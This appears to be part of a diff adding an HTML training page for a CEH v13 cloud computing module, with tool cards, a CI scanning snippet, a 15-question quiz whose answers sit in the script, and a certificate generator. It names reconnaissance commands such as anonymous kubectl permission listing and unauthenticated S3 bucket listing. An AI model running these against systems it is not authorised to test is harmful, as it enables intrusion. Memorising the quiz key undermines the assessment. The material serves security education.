+                            <p><strong>Features:</strong> Cluster enumeration, pod exploitation</p>
+                            <p><strong>Usage:</strong> kubectl auth can-i --list --as system:anonymous</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>📊 Monitoring and Detection Tools</h3>
+                    
+                    <div class="grid">
+                        <div class="tool-card">
+                            <h4>🔍 Falco</h4>
+                            <p><strong>Purpose:</strong> Runtime security monitoring</p>
+                            <p><strong>Features:</strong> Container behavior analysis and threat detection</p>
+                            <p><strong>Usage:</strong> Real-time security event monitoring</p>
+                        </div>
+
+                        <div class="tool-card">
+                            <h4>📈 Grafana</h4>
+                            <p><strong>Purpose:</strong> Security metrics visualization</p>
+                            <p><strong>Features:</strong> Dashboards for cloud security monitoring</p>
+                            <p><strong>Usage:</strong> Visual analytics for security data</p>
+                        </div>
+
+                        <div class="tool-card">
+                            <h4>🚨 OSSEC</h4>
+                            <p><strong>Purpose:</strong> Host-based intrusion detection</p>
+                            <p><strong>Features:</strong> Log analysis, file integrity monitoring</p>
+                            <p><strong>Usage:</strong> Cloud instance security monitoring</p>
+                        </div>
+
+                        <div class="tool-card">
+                            <h4>🔐 Vault</h4>
+                            <p><strong>Purpose:</strong> Secrets management platform</p>
+                            <p><strong>Features:</strong> Dynamic secrets, encryption as a service</p>
+                            <p><strong>Usage:</strong> Centralized secrets management for cloud</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>⚙️ Tool Integration and Automation</h3>
+                    
+                    <h4>CI/CD Security Integration:</h4>
+                    <div class="code-block"># GitHub Actions security scanning
+name: Security Scan
+on: [push, pull_request]
+jobs:
+  security:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v2
+    - name: Run Trivy
+      run: trivy fs --exit-code 1 --severity HIGH,CRITICAL .
+    - name: Run Terrascan
+      run: terrascan scan -i terraform -d .</div>
+
+                    <h4>Security Automation Workflow:</h4>
+                    <ol>
+                        <li><strong>🔍 Discovery:</strong> Automated asset discovery and inventory</li>
+                        <li><strong>📊 Assessment:</strong> Continuous vulnerability scanning</li>
+                        <li><strong>🎯 Prioritization:</strong> Risk-based vulnerability prioritization</li>
+                        <li><strong>🔧 Remediation:</strong> Automated security fixes where possible</li>
+                        <li><strong>📈 Monitoring:</strong> Continuous security posture monitoring</li>
+                    </ol>
+                </div>
+
+                <button class="btn btn-primary" onclick="showSection('quiz')">Next: Assessment →</button>
+            </div>
+
+            <!-- Quiz Section -->
+            <div id="quiz" class="module-section">
+                <h2 class="section-title">📝 Module 19 Assessment</h2>
+
+                <div class="card">
+                    <h3>🎯 Knowledge Assessment</h3>
+                    <p>Test your understanding of cloud computing security concepts and techniques covered in this module.</p>
+                    
+                    <div style="background: var(--gradient-primary); color: white; padding: 20px; border-radius: 10px; margin: 20px 0;">
+                        <h4>📊 Assessment Structure:</h4>
+                        <ul>
+                            <li><strong>Questions:</strong> 15 multiple-choice questions</li>
+                            <li><strong>Time Limit:</strong> 30 minutes</li>
+                            <li><strong>Passing Score:</strong> 80% (12 correct answers)</li>
+                            <li><strong>Topics:</strong> All module sections covered</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div id="quizContent">
+                    <div class="quiz-container">
+                        <div class="question" id="question-0">
+                            <strong>Question 1 of 15:</strong><br>
+                            Which cloud service model provides the customer with the most control over the operating system and applications?
+                        </div>
+                        <div class="option" onclick="selectAnswer(0, 0)">A) Software as a Service (SaaS)</div>
+                        <div class="option" onclick="selectAnswer(0, 1)">B) Platform as a Service (PaaS)</div>
+                        <div class="option" onclick="selectAnswer(0, 2)">C) Infrastructure as a Service (IaaS)</div>
+                        <div class="option" onclick="selectAnswer(0, 3)">D) Function as a Service (FaaS)</div>
+                    </div>
+
+                    <div class="quiz-container" style="display: none;">
+                        <div class="question" id="question-1">
+                            <strong>Question 2 of 15:</strong><br>
+                            What percentage of organizations with at least one Amazon S3 bucket have it configured to be publicly readable?
+                        </div>
+                        <div class="option" onclick="selectAnswer(1, 0)">A) 25%</div>
+                        <div class="option" onclick="selectAnswer(1, 1)">B) 36%</div>
+                        <div class="option" onclick="selectAnswer(1, 2)">C) 45%</div>
+                        <div class="option" onclick="selectAnswer(1, 3)">D) 52%</div>
+                    </div>
+
+                    <div class="quiz-container" style="display: none;">
+                        <div class="question" id="question-2">
+                            <strong>Question 3 of 15:</strong><br>
+                            Which tool is primarily used for Azure AD reconnaissance and exploitation?
+                        </div>
+                        <div class="option" onclick="selectAnswer(2, 0)">A) CloudMapper</div>
+                        <div class="option" onclick="selectAnswer(2, 1)">B) AADInternals</div>
+                        <div class="option" onclick="selectAnswer(2, 2)">C) S3Scanner</div>
+                        <div class="option" onclick="selectAnswer(2, 3)">D) Trivy</div>
+                    </div>
+
+                    <div class="quiz-container" style="display: none;">
+                        <div class="question" id="question-3">
+                            <strong>Question 4 of 15:</strong><br>
+                            What is the default IP address used by cloud instances to access metadata services?
+                        </div>
+                        <div class="option" onclick="selectAnswer(3, 0)">A) 192.168.1.1</div>
+                        <div class="option" onclick="selectAnswer(3, 1)">B) 169.254.169.254</div>
+                        <div class="option" onclick="selectAnswer(3, 2)">C) 10.0.0.1</div>
+                        <div class="option" onclick="selectAnswer(3, 3)">D) 172.16.0.1</div>
+                    </div>
+
+                    <div class="quiz-container" style="display: none;">
+                        <div class="question" id="question-4">
+                            <strong>Question 5 of 15:</strong><br>
+                            Which OWASP Cloud Security Top 10 risk involves weak authentication and poor credential management?
+                        </div>
+                        <div class="option" onclick="selectAnswer(4, 0)">A) Insecure Interfaces and APIs</div>
+                        <div class="option" onclick="selectAnswer(4, 1)">B) Insufficient Identity, Credential, and Access Management</div>
+                        <div class="option" onclick="selectAnswer(4, 2)">C) System and Application Vulnerabilities</div>
+                        <div class="option" onclick="selectAnswer(4, 3)">D) Data Loss and Data Leakage</div>
+                    </div>
+
+                    <div class="quiz-container" style="display: none;">
+                        <div class="question" id="question-5">
+                            <strong>Question 6 of 15:</strong><br>
+                            What AWS CLI command is used to list the contents of an S3 bucket without authentication?
+                        </div>
+                        <div class="option" onclick="selectAnswer(5, 0)">A) aws s3 ls s3://bucket-name</div>
+                        <div class="option" onclick="selectAnswer(5, 1)">B) aws s3 ls s3://bucket-name --no-sign-request</div>
+                        <div class="option" onclick="selectAnswer(5, 2)">C) aws s3 sync s3://bucket-name</div>
+                        <div class="option" onclick="selectAnswer(5, 3)">D) aws s3api list-objects --bucket bucket-name</div>
+                    </div>
+
+                    <div class="quiz-container" style="display: none;">
+                        <div class="question" id="question-6">
+                            <strong>Question 7 of 15:</strong><br>
+                            Which container vulnerability scanner is commonly used to assess Docker image security?
+                        </div>
+                        <div class="option" onclick="selectAnswer(6, 0)">A) Nmap</div>
+                        <div class="option" onclick="selectAnswer(6, 1)">B) Burp Suite</div>
+                        <div class="option" onclick="selectAnswer(6, 2)">C) Trivy</div>
+                        <div class="option" onclick="selectAnswer(6, 3)">D) Metasploit</div>
+                    </div>
+
+                    <div class="quiz-container" style="display: none;">
+                        <div class="question" id="question-7">
+                            <strong>Question 8 of 15:</strong><br>
+                            What is the primary security concern with multi-tenant cloud environments?
+                        </div>
+                        <div class="option" onclick="selectAnswer(7, 0)">A) Higher costs</div>
+                        <div class="option" onclick="selectAnswer(7, 1)">B) Slower performance</div>
+                        <div class="option" onclick="selectAnswer(7, 2)">C) Cross-tenant data leakage</div>
+                        <div class="option" onclick="selectAnswer(7, 3)">D) Limited scalability</div>
+                    </div>
+
+                    <div class="quiz-container" style="display: none;">
+                        <div class="question" id="question-8">
+                            <strong>Question 9 of 15:</strong><br>
+                            Which Azure AD attack technique involves intercepting authentication requests in Pass-Through Authentication environments?
+                        </div>
+                        <div class="option" onclick="selectAnswer(8, 0)">A) Password Spraying</div>
+                        <div class="option" onclick="selectAnswer(8, 1)">B) PTASpy</div>
+                        <div class="option" onclick="selectAnswer(8, 2)">C) Device Code Phishing</div>
+                        <div class="option" onclick="selectAnswer(8, 3)">D) Token Replay</div>
+                    </div>
+
+                    <div class="quiz-container" style="display: none;">
+                        <div class="question" id="question-9">
+                            <strong>Question 10 of 15:</strong><br>
+                            What is the main advantage of using Infrastructure as Code (IaC) for security?
+                        </div>
+                        <div class="option" onclick="selectAnswer(9, 0)">A) Faster deployment</div>
+                        <div class="option" onclick="selectAnswer(9, 1)">B) Lower costs</div>
+                        <div class="option" onclick="selectAnswer(9, 2)">C) Consistent security configurations</div>
+                        <div class="option" onclick="selectAnswer(9, 3)">D) Better performance</div>
+                    </div>
+
+                    <div class="quiz-container" style="display: none;">
+                        <div class="question" id="question-10">
+                            <strong>Question 11 of 15:</strong><br>
+                            Which Kubernetes component should be secured to prevent unauthorized cluster access?
+                        </div>
+                        <div class="option" onclick="selectAnswer(10, 0)">A) kubelet</div>
+                        <div class="option" onclick="selectAnswer(10, 1)">B) API server</div>
+                        <div class="option" onclick="selectAnswer(10, 2)">C) etcd</div>
+                        <div class="option" onclick="selectAnswer(10, 3)">D) All of the above</div>
+                    </div>
+
+                    <div class="quiz-container" style="display: none;">
+                        <div class="question" id="question-11">
+                            <strong>Question 12 of 15:</strong><br>
+                            What is Shadow IT in the context of cloud security?
+                        </div>
+                        <div class="option" onclick="selectAnswer(11, 0)">A) Encrypted communications</div>
+                        <div class="option" onclick="selectAnswer(11, 1)">B) Unauthorized IT systems or solutions</div>
+                        <div class="option" onclick="selectAnswer(11, 2)">C) Backup security systems</div>
+                        <div class="option" onclick="selectAnswer(11, 3)">D) Advanced threat detection</div>
+                    </div>
+
+                    <div class="quiz-container" style="display: none;">
+                        <div class="question" id="question-12">
+                            <strong>Question 13 of 15:</strong><br>
+                            Which AWS service provides threat detection and continuous security monitoring?
+                        </div>
+                        <div class="option" onclick="selectAnswer(12, 0)">A) CloudWatch</div>
+                        <div class="option" onclick="selectAnswer(12, 1)">B) GuardDuty</div>
+                        <div class="option" onclick="selectAnswer(12, 2)">C) Inspector</div>
+                        <div class="option" onclick="selectAnswer(12, 3)">D) Config</div>
+                    </div>
+
+                    <div class="quiz-container" style="display: none;">
+                        <div class="question" id="question-13">
+                            <strong>Question 14 of 15:</strong><br>
+                            What is the primary purpose of container image signing?
+                        </div>
+                        <div class="option" onclick="selectAnswer(13, 0)">A) Faster deployment</div>
+                        <div class="option" onclick="selectAnswer(13, 1)">B) Smaller image size</div>
+                        <div class="option" onclick="selectAnswer(13, 2)">C) Supply chain security</div>
+                        <div class="option" onclick="selectAnswer(13, 3)">D) Better performance</div>
+                    </div>
+
+                    <div class="quiz-container" style="display: none;">
+                        <div class="question" id="question-14">
+                            <strong>Question 15 of 15:</strong><br>
+                            Which cloud security framework is specifically designed for cloud environments by the Cloud Security Alliance?
+                        </div>
+                        <div class="option" onclick="selectAnswer(14, 0)">A) NIST Cybersecurity Framework</div>
+                        <div class="option" onclick="selectAnswer(14, 1)">B) ISO 27001</div>
+                        <div class="option" onclick="selectAnswer(14, 2)">C) Cloud Controls Matrix (CCM)</div>
+                        <div class="option" onclick="selectAnswer(14, 3)">D) CIS Controls</div>
+                    </div>
+                </div>
+
+                <div style="text-align: center; margin: 30px 0;">
+                    <button class="btn btn-primary" onclick="previousQuestion()" id="prevBtn" style="display: none;">← Previous</button>
+                    <button class="btn btn-success" onclick="nextQuestion()" id="nextBtn">Next →</button>
+                    <button class="btn btn-warning" onclick="submitQuiz()" id="submitBtn" style="display: none;">Submit Quiz</button>
+                </div>
+
+                <div id="quizResults" style="display: none;">
+                    <div class="quiz-results">
+                        <h3>📊 Quiz Results</h3>
+                        <p id="scoreText"></p>
+                        <p id="gradeText"></p>
+                        <button class="btn btn-primary" onclick="reviewAnswers()">Review Answers</button>
+                        <button class="btn btn-success" onclick="retakeQuiz()">Retake Quiz</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Certification Section -->
+            <div id="certification" class="module-section">
+                <h2 class="section-title">🏆 Module 19 Certification</h2>
+
+                <div class="quiz-results">
+                    <h2>🎉 Congratulations!</h2>
+                    <p>You have successfully completed CEH v13 Module 19: Cloud Computing</p>
+                    <div style="margin: 30px 0;">
+                        <h3>✅ Certification Requirements Met:</h3>
+                        <div style="text-align: left; max-width: 600px; margin: 20px auto;">
+                            <p>☑️ Completed all module sections</p>
+                            <p>☑️ Achieved 80%+ on knowledge assessment</p>
+                            <p>☑️ Demonstrated understanding of cloud security concepts</p>
+                            <p>☑️ Mastered cloud attack techniques and countermeasures</p>
+                        </div>
+                    </div>
+                    <h4>🎯 Skills Mastered:</h4>
+                    <ul style="text-align: left; max-width: 600px; margin: 20px auto; line-height: 1.8;">
+                        <li><strong>Cloud Fundamentals:</strong> IaaS, PaaS, SaaS models and deployment types</li>
+                        <li><strong>Security Threats:</strong> OWASP Cloud Top 10 and attack vectors</li>
+                        <li><strong>AWS Security:</strong> S3 exploitation, IAM privilege escalation</li>
+                        <li><strong>Azure AD Attacks:</strong> Reconnaissance, authentication bypass</li>
+                        <li><strong>Container Security:</strong> Docker and Kubernetes vulnerabilities</li>
+                        <li><strong>Defense Strategies:</strong> Security controls and monitoring</li>
+                        <li><strong>Security Tools:</strong> Cloud-specific assessment and exploitation tools</li>
+                    </ul>
+                </div>
+
+                <div class="card">
+                    <h3>🚀 Next Steps in Your CEH Journey</h3>
+                    <div style="background: var(--gradient-primary); padding: 25px; border-radius: 15px; color: white; margin: 20px 0;">
+                        <h4>🎯 Continue Your Learning Path:</h4>
+                        <ul style="margin: 15px 0; padding-left: 20px; line-height: 1.8;">
+                            <li><strong>Module 20:</strong> Cryptography and PKI</li>
+                            <li><strong>Advanced Topics:</strong> Cloud-native security, DevSecOps</li>
+                            <li><strong>Hands-on Practice:</strong> Set up cloud labs for practical experience</li>
+                            <li><strong>Certification Exam:</strong> Prepare for the CEH v13 certification exam</li>
+                            <li><strong>Specialization:</strong> Consider cloud security specialization paths</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>💼 Career Applications</h3>
+                    <p>The cloud security skills you've developed in this module are directly applicable to these career paths:</p>
+                    <div class="grid">
+                        <div style="background: var(--gradient-success); color: white; padding: 20px; border-radius: 10px;">
+                            <h4>☁️ Cloud Security Engineer</h4>
+                            <p>Design and implement security controls in cloud environments</p>
+                        </div>
+                        <div style="background: var(--gradient-warning); color: white; padding: 20px; border-radius: 10px;">
+                            <h4>🔍 Cloud Penetration Tester</h4>
+                            <p>Assess cloud infrastructure security through ethical hacking</p>
+                        </div>
+                        <div style="background: var(--gradient-danger); color: white; padding: 20px; border-radius: 10px;">
+                            <h4>🛡️ DevSecOps Engineer</h4>
+                            <p>Integrate security into CI/CD pipelines and containerized applications</p>
+                        </div>
+                        <div style="background: var(--gradient-primary); color: white; padding: 20px; border-radius: 10px;">
+                            <h4>📊 Cloud Security Architect</h4>
+                            <p>Design comprehensive security architectures for cloud migrations</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div style="text-align: center; margin: 30px 0;">
+                    <button class="btn btn-success" id="claimCertBtn" onclick="claimCertification()">🏆 Claim Your Certificate</button>
+                    <button class="btn btn-warning" onclick="showSection('overview')" style="margin-left: 10px;">🔄 Review Module</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal for detailed information -->
+    <div id="detailModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal()">&times;</span>
+            <div id="modalContent"></div>
+        </div>
+    </div>
+
+    <script>
+        // Global variables
+        let currentSection = 'overview';
+        let completedSections = new Set();
+        let sectionOrder = ['overview', 'fundamentals', 'service-models', 'security-threats', 'attack-techniques', 'aws-hacking', 'azure-hacking', 'container-security', 'countermeasures', 'tools', 'quiz', 'certification'];
+        let currentQuestion = 0;
+        let quizAnswers = {};
+        let quizScore = 0;
+        let startTime = Date.now();
+
+        // Quiz questions and correct answers
+        const quizData = [
+            { correct: 2, explanation: "Infrastructure as a Service (IaaS) provides the most control, allowing customers to manage the operating system, applications, and data while the provider manages the underlying infrastructure." },
+            { correct: 1, explanation: "According to security research, 36% of organizations with at least one Amazon S3 bucket have it configured to be publicly readable, representing a significant security risk." },
+            { correct: 1, explanation: "AADInternals is a comprehensive PowerShell toolkit specifically designed for Azure AD security research, reconnaissance, and exploitation." },
+            { correct: 1, explanation: "169.254.169.254 is the link-local address used by cloud providers (AWS, Azure, GCP) for instance metadata services, accessible from within cloud instances." },
+            { correct: 1, explanation: "Insufficient Identity, Credential, and Access Management is the #1 risk in OWASP Cloud Security Top 10, covering weak authentication and poor credential management." },
+            { correct: 1, explanation: "The --no-sign-request flag allows listing S3 bucket contents without authentication, useful for testing public bucket configurations." },
+            { correct: 2, explanation: "Trivy is a comprehensive vulnerability scanner specifically designed for containers, scanning OS packages and application dependencies for known vulnerabilities." },
+            { correct: 2, explanation: "Cross-tenant data leakage is the primary security concern in multi-tenant environments, where inadequate isolation could expose one tenant's data to another." },
+            { correct: 1, explanation: "PTASpy (PTA Spy) is an advanced persistence technique that intercepts Azure AD Pass-Through Authentication requests to harvest credentials." },
+            { correct: 2, explanation: "Infrastructure as Code ensures consistent security configurations by defining infrastructure and security settings in version-controlled code, reducing configuration drift." },
+            { correct: 3, explanation: "All Kubernetes components (kubelet, API server, etcd) should be properly secured as they each present different attack surfaces and access to cluster resources." },
+            { correct: 1, explanation: "Shadow IT refers to IT systems or solutions developed outside the proper approval chain, creating security risks through unmanaged resources." },
+            { correct: 1, explanation: "AWS GuardDuty is a threat detection service that uses machine learning to continuously monitor for malicious activity and unauthorized behavior." },
+            { correct: 2, explanation: "Container image signing ensures supply chain security by cryptographically verifying the authenticity and integrity of container images." },
+            { correct: 2, explanation: "The Cloud Controls Matrix (CCM) by the Cloud Security Alliance is specifically designed to provide security controls for cloud computing environments." }
+        ];
+
+        // Initialize page
+        document.addEventListener('DOMContentLoaded', function() {
+            showSection('overview');
+            updateProgress();
+            
+            // Add keyboard navigation
+            document.addEventListener('keydown', function(event) {
+                if (event.key === 'Escape') {
+                    closeModal();
+                } else if (event.key === 'ArrowLeft') {
+                    navigateSection(-1);
+                } else if (event.key === 'ArrowRight') {
+                    navigateSection(1);
+                }
+            });
+        });
+
+        // Section navigation
+        function showSection(sectionId) {
+            // Hide all sections
+            document.querySelectorAll('.module-section').forEach(section => {
+                section.classList.remove('active');
+            });
+            
+            // Show selected section
+            document.getElementById(sectionId).classList.add('active');
+            
+            // Update navigation
+            document.querySelectorAll('.nav-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            event.target.classList.add('active');
+            
+            currentSection = sectionId;
+            completedSections.add(sectionId);
+            updateProgress();
+        }
+
+        // Keyboard navigation
+        function navigateSection(direction) {
+            const currentIndex = sectionOrder.indexOf(currentSection);
+            let newIndex = currentIndex + direction;
+            
+            if (newIndex >= 0 && newIndex < sectionOrder.length) {
+                const newSection = sectionOrder[newIndex];
+                showSection(newSection);
+                
+                // Update active button
+                document.querySelectorAll('.nav-btn').forEach((btn, index) => {
+                    btn.classList.remove('active');
+                    if (index === newIndex) {
+                        btn.classList.add('active');
+                    }
+                });
+            }
+        }
+
+        // Update progress bar
+        function updateProgress() {
+            const progress = (completedSections.size / sectionOrder.length) * 100;
+            document.getElementById('progressBar').style.width = progress + '%';
+            document.getElementById('progressText').textContent = 
+                `Progress: ${Math.round(progress)}% Complete (${completedSections.size}/${sectionOrder.length} sections)`;
+        }
+
+        // Quiz functionality
+        function selectAnswer(questionIndex, answerIndex) {
+            // Remove previous selections
+            const questionContainer = document.querySelectorAll('.quiz-container')[questionIndex];
+            questionContainer.querySelectorAll('.option').forEach(option => {
+                option.classList.remove('selected');
+            });
+            
+            // Add selection to clicked option
+            questionContainer.querySelectorAll('.option')[answerIndex].classList.add('selected');
+            quizAnswers[questionIndex] = answerIndex;
+        }
+
+        function nextQuestion() {
+            if (currentQuestion < 14) {
+                // Hide current question
+                document.querySelectorAll('.quiz-container')[currentQuestion].style.display = 'none';
+                currentQuestion++;
+                // Show next question
+                document.querySelectorAll('.quiz-container')[currentQuestion].style.display = 'block';
+                
+                // Update buttons
+                document.getElementById('prevBtn').style.display = 'inline-block';
+                if (currentQuestion === 14) {
+                    document.getElementById('nextBtn').style.display = 'none';
+                    document.getElementById('submitBtn').style.display = 'inline-block';
+                }
+            }
+        }
+
+        function previousQuestion() {
+            if (currentQuestion > 0) {
+                // Hide current question
+                document.querySelectorAll('.quiz-container')[currentQuestion].style.display = 'none';
+                currentQuestion--;
+                // Show previous question
+                document.querySelectorAll('.quiz-container')[currentQuestion].style.display = 'block';
+                
+                // Update buttons
+                document.getElementById('submitBtn').style.display = 'none';
+                document.getElementById('nextBtn').style.display = 'inline-block';
+                if (currentQuestion === 0) {
+                    document.getElementById('prevBtn').style.display = 'none';
+                }
+            }
+        }
+
+        function submitQuiz() {
+            // Calculate score
+            let correct = 0;
+            for (let i = 0; i < 15; i++) {
+                if (quizAnswers[i] === quizData[i].correct) {
+                    correct++;
+                }
+            }
+            
+            quizScore = (correct / 15) * 100;
+            
+            // Hide quiz content
+            document.getElementById('quizContent').style.display = 'none';
+            document.querySelector('#quiz .quiz-container').parentElement.querySelectorAll('button').forEach(btn => btn.style.display = 'none');
+            
+            // Show results
+            document.getElementById('quizResults').style.display = 'block';
+            document.getElementById('scoreText').textContent = `Your Score: ${correct}/15 (${Math.round(quizScore)}%)`;
+            
+            let grade = '';
+            if (quizScore >= 90) grade = '🏆 Excellent!';
+            else if (quizScore >= 80) grade = '✅ Pass - Well Done!';
+            else if (quizScore >= 70) grade = '⚠️ Close - Review and Retry';
+            else grade = '❌ Please Review Material and Retake';
+            
+            document.getElementById('gradeText').innerHTML = grade;
+            
+            // Mark quiz as completed if passed
+            if (quizScore >= 80) {
+                completedSections.add('quiz');
+                updateProgress();
+            }
+        }
+
+        function reviewAnswers() {
+            // Show detailed answer review
+            let reviewHTML = '<h3>📋 Answer Review</h3>';
+            
+            for (let i = 0; i < 15; i++) {
+                const userAnswer = quizAnswers[i];
+                const correctAnswer = quizData[i].correct;
+                const isCorrect = userAnswer === correctAnswer;
+                
+                reviewHTML += `
+                    <div style="background: ${isCorrect ? '#e8f5e8' : '#ffe8e8'}; padding: 15px; margin: 10px 0; border-radius: 8px;">
+                        <strong>Question ${i + 1}:</strong> ${isCorrect ? '✅ Correct' : '❌ Incorrect'}<br>
+                        <em>Explanation:</em> ${quizData[i].explanation}
+                    </div>
+                `;
+            }
+            
+            showModal(reviewHTML);
+        }
+
+        function retakeQuiz() {
+            // Reset quiz
+            currentQuestion = 0;
+            quizAnswers = {};
+            quizScore = 0;
+            
+            // Reset display
+            document.querySelectorAll('.quiz-container').forEach((container, index) => {
+                container.style.display = index === 0 ? 'block' : 'none';
+                container.querySelectorAll('.option').forEach(option => {
+                    option.classList.remove('selected', 'correct', 'incorrect');
+                });
+            });
+            
+            // Reset buttons
+            document.getElementById('prevBtn').style.display = 'none';
+            document.getElementById('nextBtn').style.display = 'inline-block';
+            document.getElementById('submitBtn').style.display = 'none';
+            
+            // Show quiz content, hide results
+            document.getElementById('quizContent').style.display = 'block';
+            document.getElementById('quizResults').style.display = 'none';
+            document.querySelector('#quiz .quiz-container').parentElement.querySelectorAll('button').forEach(btn => btn.style.display = 'inline-block');
+        }
+
+        function claimCertification() {
+            const endTime = Date.now();
+            const studyTime = Math.round((endTime - startTime) / 1000 / 60); // minutes
+            
+            const certHTML = `
+                <div style="text-align: center; padding: 30px;">
+                    <h2>🎓 Certificate of Completion</h2>
+                    <div style="border: 3px solid #gold; padding: 30px; margin: 20px 0; border-radius: 15px; background: linear-gradient(135deg, #f6f6f6, #e9e9e9);">
+                        <h3>CEH v13 Module 19: Cloud Computing</h3>
+                        <p style="font-size: 1.2em; margin: 20px 0;">This certifies that you have successfully completed the comprehensive study of cloud computing security, demonstrating proficiency in:</p>
+                        <ul style="text-align: left; max-width: 500px; margin: 20px auto;">
+                            <li>Cloud service models and deployment types</li>
+                            <li>Cloud security threats and vulnerabilities</li>
+                            <li>AWS and Azure attack techniques</li>
+                            <li>Container security assessment</li>
+                            <li>Cloud security countermeasures</li>
+                        </ul>
+                        <p><strong>Study Time:</strong> ${studyTime} minutes</p>
+                        <p><strong>Quiz Score:</strong> ${Math.round(quizScore)}%</p>
+                        <p><strong>Completion Date:</strong> ${new Date().toLocaleDateString()}</p>
+                    </div>
+                    <p style="color: #666; font-size: 0.9em;">Keep building your cybersecurity expertise with continued learning and practice!</p>
+                </div>
+            `;
+            
+            showModal(certHTML);
+        }
+
+        // Modal functions
+        function showModal(content) {
+            document.getElementById('modalContent').innerHTML = content;
+            document.getElementById('detailModal').style.display = 'block';
+        }
+
+        function closeModal() {
+            document.getElementById('detailModal').style.display = 'none';
+        }
+
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            const modal = document.getElementById('detailModal');
+            if (event.target === modal) {
+                closeModal();
+            }
+        }
+    </script>
+</body>
+</html>
+
+                        
